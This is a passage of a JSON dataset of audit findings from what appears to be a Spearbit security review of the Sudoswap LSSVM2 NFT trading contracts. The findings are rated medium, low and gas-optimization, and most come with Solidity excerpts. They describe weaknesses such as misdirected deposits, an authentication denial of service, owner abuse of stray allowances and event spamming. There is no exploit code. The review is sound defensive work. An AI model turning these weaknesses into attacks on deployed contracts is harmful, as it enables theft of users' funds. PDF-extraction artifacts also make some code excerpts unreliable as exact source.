        "body": "Functions depositNFTs() and depositERC20() allow deposits of ERC 721 NFTs and ERC20 tokens after pair creation. While they check that the deposit recipient is a valid pair/variant for emitting an event, the deposit transfers happen prior to the check and without the same validation. With dual home tokens (see weird-erc20), the emit could be skipped when the \"other\" token is transferred. Also, the isPair() check in depositNFTs() does not specifically check if the pair variant is ERC721_ERC20 or ERC721_ETH. This allows accidentally misdirected deposits to invalid pair variants or non-pair recipients leading to loss/lock of NFTs/tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "authAllowedForToken() returns prematurely in certain scenarios causing an authentication DoS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Tokens listed on Nifty or Foundation (therefore returning a valid niftyRegistry or foundationTrea- sury) where the proposedAuthAddress is not a valid Nifty sender or a valid Foundation Treasury admin will cause an authentication DoS if the token were also listed on Digitalax or ArtBlocks and the proposedAuthAddress had admin roles on those platforms. This happens because the return values of valid and isAdmin for isValidNiftySender(proposedAuthAddress) and isAdmin(proposedAuthAddress) respectively are returned as-is instead of returning only if/when they are true but continuing the checks for authorization otherwise (if/when they are false) on Digitalax and ArtBlocks. toggleSettingsForCollection and reclaimPair (which utilize authAllowedForToken) would incorrectly fail for valid proposedAuthAddress in such scenarios. 21 return",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Partial fills don't recycle ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After several fixes are applied, the following code exists. If the sell can be filled completely then ETH is recycled, however when a partial fill is applied then ETH is not recycled. This might lead to a revert and would require doing the trade again. This costs extra gas and the trading conditions might be worse then. function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) { ... // Go through each sell order ... if (pairSpotPrice == order.expectedSpotPrice) { // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued if (order.isETHSell && swapOrder.recycleETH) { ... ... order.pair.swapNFTsForToken(... , payable(address(this)), ... ); } // Otherwise, all tokens or ETH received from the sale go to the token recipient else { ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); } } // Otherwise we need to do some partial fill calculations first else { ... ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); // ETH not recycled } // Go through each buy order ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong allowances can be abused by the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function call() allows transferring tokens and NFTs that have an allowance set to the pair. Normally, allowances should be given to the router, but they could be accidentally given to the pair. Although call() is protected by onlyOwner, the pair is created permissionless and so the owner could be anyone.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious router mitigation may break for deflationary tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "ERC20 _pullTokenInputAndPayProtocolFee() for routers has a mitigation for malicious routers by checking if the before-after token balance difference is equal to the transferred amount. This will break for any ERC20 pairs with fee-on-transfer deflationary tokens (see weird-erc20). Note that there has been a real-world exploit related to this with Balancer pool and STA deflationary tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent royalty threshold checks allow some royalties to be equal to sale amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Threshold checks on royalty amounts are implemented both in _getRoyaltyAndSpec() and its caller _calculateRoyalties(). While _calculateRoyalties() implements an inclusive check with require(saleAmount >= royaltyTotal, \"Royalty exceeds sale price\");, (allowing royalty to be equal to sale amount) the different checks in _getRoyaltyAndSpec() on the returned amounts or in the calculations on bps in _computeAmounts() exclude the saleAmount forcing royalty to be less than the saleAmount. However, only Known Origin and SuperRare are missing a similar threshold check in _getRoyaltyAndSpec(). This allows only the Known Origin and SuperRare royalties to be equal to the sale amount as enforced by the check in _calculateRoyalties().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Numerical difference between getNFTQuoteForBuyOrderWithPartialFill() and _findMaxFill- ableAmtForBuy() may lead to precision errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "There is a slight numerical instability between the partial fill calculation and the first client side cal- culation (i.e. getNFTQuoteForSellOrderWithPartialFill() / getNFTQuoteForBuyOrderWithPartialFill(), _- findMaxFillableAmtForBuy() ). This is because getNFTQuoteForSellOrderWithPartialFill() first assumes a buy of 1 item, updates spotPrice/delta, and then gets the next subsequent quote to buy the next item. Whereas _findMaxFillableAmtForBuy() assumes buying multiple items at one time. This can for e.g. Exponential- Curve.sol and XykCurve.sol lead to minor numerical precision errors. function getNFTQuoteForBuyOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, ...); ... } } function getNFTQuoteForSellOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getSellInfo(spotPrice, delta, 1, fee, ... ); ... } ... } function _findMaxFillableAmtForBuy(LSSVMPair pair, uint256 maxNumNFTs, uint256[] memory ,! maxCostPerNumNFTs, uint256 ... while (start <= end) { ... (...) = pair.bondingCurve().getBuyInfo(spotPrice, delta, (start + end)/2, feeMultiplier, ,! protocolFeeMultiplier); ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Differences with Manifold version of RoyaltyEngine may cause unexpected behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Sudoswap has forked RoyaltyEngine from Manifold; however there are some differences. The Manifold version of _getRoyaltyAndSpec() also queries getRecipients(), while the Sudoswap version doesn't. This means the Sudoswap will not spread the royalties over all recipients. function _getRoyaltyAndSpec(...) // Manifold ,! ,! ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 amount) { ... try IRoyaltySplitter(royaltyAddress).getRecipients() returns (Recipient[] memory splitRecipients) { ... } } } function _getRoyaltyAndSpec(...) // Sudoswap ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 ,! amount) { ... } ... } } The Manifold version of getRoyalty() has an extra try/catch compared to the Sudoswap version. This protects against reverts in the cached functions. Note: adding an extra try/catch requires the function _getRoyaltyAnd- Spec() to be external. function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Manifold ... try this._getRoyaltyAndSpec{gas: 100000}(tokenAddress, tokenId, value) returns ( ... ) .... } function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Sudoswap ... ... (...) = _getRoyaltyAndSpec(tokenAddress, tokenId, value); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Swaps with property-checked ERC1155 sell orders in VeryFastRouter will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Any swap batch of transactions which has a property-checked sell order for ERC1155 will revert. Given that property checks are not supported on ERC1155 pairs (but only ERC721), swap sell orders for ERC1155 in VeryFastRouter will fail if order.doPropertyCheck is accidentally set because the logic thereafter assumes it is an ERC721 order.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell because it uses > instead of >= in the check pairBalance > newPriceToSellToPair.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of support for per-token royalties may lead to incorrect royalty payments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol currently lacks complete support for per-token royalties, assumes that all NFTs in a pair have the same royalty and so considers the first assetId to determine royalties for all NFT token Ids in the pair. If not, the pair owner is expected to make a new pair for NFTs that have different royalties. A pair with NFTs that have different royalties will lead to incorrect royalty payments for the different NFTs.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing additional safety for multicall may lead to lost ETH in future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If the function multicall() would be payable, then multiple delegated-to functions could use the same msg.value , which could result in losing ETH from the pair. A future upgrade of Solidity might change the default setting for function to payable. See Solidity issue#12539. function multicall(bytes[] calldata calls, bool revertOnFail) external onlyOwner { for (uint256 i; i < calls.length;) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing zero-address check may allow re-initialization of pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "address(0), \"Initialized\");. However, without a zero-address check on _owner, this can be true even later if the pair is initialized accidentally with address(0) instead of msg.sender. This is because __Ownable_init in OwnableWithTransferCallback does not disallow address(0) unlike transferOwnership. This is however not the case with the current implementation where LSSVMPair.initialize() is called from LSSVMPairFactory with msg.sender as argument for _owner. it Therefore, LSSVMPair.initialize() may be called multiple times.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Trade pair owners are allowed to change asset recipient address when it has no impact",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Trade pair owners are allowed to change their asset recipient address using changeAssetRecipi- ent() while getAssetRecipient() always returns the pair address itself for Trade pairs as expected. Trade pair owners mistakenly assume that they can change their asset recipient address using changeAssetRe- cipient() because they are allowed to do so successfully, but may be surprised to see that it has no effect. They may expect assets at the new address but that will not be the case.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "NFT projects with custom settings and multiple royalty receivers will receive royalty only for first receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "_calculateRoyalties() and its view equivalent only consider the first royalty receiver when custom settings are enabled. If non-ERC-2981 compliant NFT projects on Manifold/ArtBlocks or other platforms that support multiple royalty receivers come up with custom settings that pair owners subscribe to, then all the royalty will go to the first recipient. Other receivers will not receive any royalties.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing non-zero checks allow event emission spamming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions depositNFTs() and depositERC20() are meant to allow deposits into the pair post- creation. However, they do not check if non-zero NFTs or tokens are being deposited. The event emission only checks if the pair recipient is valid. Given their permissionless nature, this allows anyone to grief the system with zero NFT/token deposits causing emission of events which may hinder indexing/monitoring systems.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing sanity zero-address checks may lead to undesired behavior or lock of funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Certain logic requires zero-address checks to avoid undesired behavior or lock of funds. For exam- ple, in Splitter.sol#L34 users can permanently lock ETH by mistakenly using safeTransferETH with default/zero- address value.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Legacy NFTs are not compatible with protocol pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Pairs support ERC721 and ERC1155 NFTs. However, users of NFT marketplaces may also expect to find OG NFTs such as Cryptopunks, Etherrocks or Cryptokitties, which do not adhere to these ERC standards. For example, Cryptopunks have their own internal marketplace which allows users to trade their NFTs with other users. Given that Cryptopunks does not adhere to the ERC721 standard, it will always fail when the protocol attempts to trade them. Even with wrapped versions of these NFTs, people who aren't aware or have the original version won't be able to trade them in a pair.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary payable specifier for functions may allow ETH to be sent and locked/lost",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "LSSVMPair.initialize() which do not expect to receive and process Ether have the payable specifier which allows interacting users to accidentally send them Ether which will get locked/lost. LSSVMRouter.robustSwapERC20ForSpecificNFTsAndNFTsToToken() Functions",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Obsolete Splitter contract may lead to locked ETH/tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After a pair has be reclaimed via reclaimPair(), pairInfos[] will be emptied and getPrevFeeRe- cipientForPair() will return 0. The obsolete Splitter will however remain present, but any ETH or tokens that are sent to the contract can't be completely retrieved via withdrawETH() and withdrawTokens(). This is because getPrevFeeRecipientForPair() is 0 and the tokens would be send to address(0). It is unlikely though that ETH or tokens are sent to the Splitter contract as it is not used anymore. function withdrawETH(uint256 ethAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... payable(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter())).safeTransferETH(... ); ,! } function withdrawTokens(ERC20 token, uint256 tokenAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... token.safeTransfer(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter()), ... ); c } function getPrevFeeRecipientForPair(address pairAddress) public view returns (address) { return pairInfos[pairAddress].prevFeeRecipient; } function reclaimPair(address pairAddress) public { ... delete pairInfos[pairAddress]; ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Divisions in getBuyInfo() and getSellInfo() may be rounded down to 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In extreme cases (e.g. tokens with a few decimals, see this example), divisions in getBuyInfo() and getSellInfo() may be rounded down to 0. This means inputValueWithoutFee and/or outputValueWithoutFee may be 0. function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... } function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 outputValueWithoutFee = (numItems * tokenBalance) / (nftBalance + numItems); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Last NFT in an XykCurve cannot be sold",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getBuyInfo() of XykCurve enforces numItems < nftBalance, which means the last NFT can never be sold. One potential solution as suggested by the Sudoswap team is to set delta (=nftBalance) one higher than the real amount of NFTs. This could cause problems in other parts of the code. For example, once only one NFT is left, if we try to use changeSpotPriceAndDelta(), getBuyNFTQuote(1) will error and thus the prices (tokenBalance) and delta (nftBalance) can't be changed anymore. If nftBalance is set to one higher, then it won't satisfy pair.nft().balanceOf(pairAddress) >= 1. 31 contract XykCurve ... { function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // If numItems is too large, we will get divide by zero error if (numItems >= nftBalance) { return (Error.INVALID_NUMITEMS, 0, 0, 0, 0, 0); } ... } } function changeSpotPriceAndDelta(...) ... { ... (,,, uint256 priceToBuyFromPair,) = pair.getBuyNFTQuote(1); ... if (... && pair.nft().balanceOf(pairAddress) >= 1) { pair.changeSpotPrice(newSpotPrice); pair.changeDelta(newDelta); return; } ... } function getBuyNFTQuote(uint256 numNFTs) ... { (error, ...) = bondingCurve().getBuyInfo(..., numNFTs, ...); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Allowing different ERC20 tokens in LSSVMRouter swaps will affect accounting and lead to unde- fined behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "As commented \"Note: All ERC20 swaps assume that a single ERC20 token is used for all the pairs involved. * Swapping using multiple tokens in the same transaction is possible, but the slippage checks * & the return values will be meaningless and may lead to undefined behavior.\" This assumption may be risky if users end up mistakenly using different ERC20 tokens in different swaps. Summing up their inputAmount and remainingValue will not be meaningful and lead to accounting errors and undefined behavior (as noted).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing array length equality checks may lead to incorrect or undefined behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions taking two array type parameters and not checking that their lengths are equal may lead to incorrect or undefined behavior when accidentally passing arrays of unequal lengths.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Owners may have funds locked if newOwner is EOA in transferOwnership()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In transferOwnership(), if newOwner has zero code.length (i.e. EOA), newOwner.isContract() will be false and therefore, if block will be ignored. As the function is payable, any msg.value from the call would get locked in the contract. Note: ERC20 pairs and StandardSettings don't have a method to recover ETH.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use of transferFrom may lead to NFTs getting locked forever",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "ERC721 NFTs may get locked forever if the recipient is not aware of ERC721 for some reason. While safeTransferFrom() is used for ERC1155 NFTs (which has the _doSafeTransferAcceptanceCheck check on recipient and does not have an option to avoid this), transferFrom() is used for ERC721 NFTs presumably for gas savings and reentrancy concerns over its safeTransferFrom variant (which has the _checkOnERC721Received check on the recipient).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step ownership change introduces risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Single-step ownership transfers add the risk of setting an unwanted owner by accident (this includes address(0)) if the ownership transfer is not done with excessive care. The ownership control library Owned by Solmate implements a simple single-step ownership transfer without zero-address checks.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getAllPairsForSettings() may run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getAllPairsForSettings() has a loop over pairsForSettings. As the creation of pairs is permissionless, that array could get arbitrarily large. Once the array is large enough, the function will run out of gas. Note: the function is only called from the outside. function getAllPairsForSettings(address settings) external view returns (address[] memory) { uint256 numPairs = pairsForSettings[settings].length(); ... for (uint256 i; i < numPairs;) { ... unchecked { ++i; } } ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Partially implemented SellOrderWithPartialFill functionality may cause unexpected behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "pair.spotPrice() == order.expectedSpotPrice in a swap. This may be confusing to users who expect partial fills in both directions but notice unexpected behavior if deployed as-is. While the BuyOrderWithPartialFill functionality is fully implemented, the corresponding SellOrderWithPartialFill feature is partially implemented with getNFTQuoteForSellOrderWithPartialFill, an incomplete _findMaxFillableAmtForSell (placeholder comment: \"// TODO: implement\") and other supporting logic required in swap().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of deadline checks for certain swap functions allows greater exposure to volatile market prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Many swap functions in LSSVMRouter use the checkDeadline modifier to prevent swaps from execut- ing beyond a certain user-specified deadline. This is presumably to reduce exposure to volatile market prices on top of the thresholds of maxCost for buys and minOutput for sells. However two router functions robustSwapETH- ForSpecificNFTsAndNFTsToToken and robustSwapERC20ForSpecificNFTsAndNFTsToToken in LSSVMRouter and all functions in VeryFastRouter are missing this modifier and the user parameter required for it. Users attempting to swap using these two swap functions do not have a way to specify a deadline for their execution unlike the other swap functions in this router. If the front-end does not highlight or warn about this, then the user swaps may get executed after a long time depending on the tip included in the transaction and the network congestion. This causes greater exposure for the swaps to volatile market prices.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing function to deposit ERC1155 NFTs after pair creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions depositNFTs() and depositERC20() are apparently used to deposit ERC721 NFTs and ERC20s into appropriate pairs after their creation. According to the project team, this is used \"for various UIs to consolidate approvals + emit a canonical event for deposits.\" However, an equivalent function for depositing ERC1155 NFTs is missing. This prevents ERC1155 NFTs from being deposited into pairs after creation for scenarios anticipated similar to ERC721 NFTs and ERC20 tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Reading from state is more gas expensive than using msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Solmate's Owned.sol contract implements the concept of ownership (by saving during contract con- struction the deployer in the owner state variable) and owner-exclusive functions via the onlyOwner() modifier. Therefore, within functions protected by the onlyOwner() modifier, the addresses stored in msg.sender and owner will be equal. So, if a function of said characteristics has to make use of the address of the owner, it is cheaper to use msg.sender than owner, because the latter reads from the contract state (using SLOAD opcode) while the former doesn't (address is directly retrieved via the cheaper CALLER opcode). Reading from state (SLOAD opcode which costs either 100 or 2100 gas units) costs more gas than using the msg.sender environmental variable (CALLER opcode which costs 2 units of gas). Note: withdrawERC20() already uses msg.sender function withdrawETH(uint256 amount) public onlyOwner { payable(owner()).safeTransferETH(amount); ... } function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner { a.safeTransfer(msg.sender, amount); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "pair.factory().protocolFeeMultiplier() is read from storage on every iteration of the loop wast- ing gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Not caching storage variables that are accessed multiple times within a loop causes waste of gas. If not cached, the solidity compiler will always read the value of protocolFeeMultiplier from storage during each iteration. For a storage variable, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory variable, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The use of factory in ERC1155._takeNFTsFromSender() can be via a parameter rather than calling factory() again",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "factory is being sent as a parameter to _takeNFTsFromSender in LSSVMPairERC721.sol#L179, which is saving gas because it is not required to read the value again. _takeNFTsFromSender(IERC721(nft()), nftIds, _factory, isRouter, routerCaller); However, in LSSVMPairERC1155.sol#L181, the similar function _takeNFTsFromSender() gets the value by calling factory() instead of using a parameter. _takeNFTsFromSender(IERC1155(nft()), numNFTs[0], isRouter, routerCaller); This creates an unnecessary asymmetry between the two contracts which are expected to be similar and also a possible gas optimization by avoiding a call to the factory getter.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variables only set at construction time could be made immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "immutable variables can be assigned either at construction time or at declaration time, and only once. The contract creation code generated by the compiler will modify the contracts runtime code before it is returned by replacing all references to immutable variables by the values assigned to the them; so the compiler does not reserve a storage slot for these variables. Declaring variables only set at construction time as immutable results in saving one call per variable to SSTORE (0x55) opcode, thus saving gas during construction.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Hoisting check out of loop will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The check numIdsFound == maxIdsNeeded will never be true before the outer for loop finishes iterating over maxIdsNeeded because numIdsFound is conditionally incremented only by 1 in each iteration.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functionality of safeBatchTransferFrom() is not used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function pairTransferERC1155From() allow that transfer of multiple id's of ERC1155 NFTs. The rest of the code only uses one id at a time. Using safeTransferFrom() instead of safeBatchTransferFrom(), might be better as it only accesses one id and uses less gas because no for loop is necessary. However future version of Sudoswap might support multiple ids. In that case its better to leave as is. function pairTransferERC1155From(..., uint256[] calldata ids, uint256[] calldata amounts,...) ... { ... nft.safeBatchTransferFrom(from, to, ids, amounts, bytes(\"\")); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using != 0 instead of > 0 can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "When dealing with unsigned integer types, comparisons with != 0 are 3 gas cheaper than > 0.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using >>1 instead of /2 can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A division by 2 can be calculated by shifting one to the right (>>1). While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieval of ether balance of contract can be gas optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The retrieval of the ether balance of a contract is typically done with address(this).balance. However, by using an assembly block and the selfbalance() instruction, one can get the balance with a discount of 15 units of gas.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function parameters should be validated at the very beginning for gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Function parameters should be validated at the very beginning of the function to allow typical execu- tion paths and revert on the exceptional paths, which will lead to gas savings over validating later.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Loop counters are not gas optimized in some places",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Loop counters are optimized in many parts of the code by using an unchecked {++i} (unchecked + prefix increment). However, this is not done in some places where it is safe to do so.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization MerklePropertyChecker.sol#L22,"
        ]
    },
    {
        "title": "Mixed use of custom errors and revert strings is inconsistent and uses extra gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
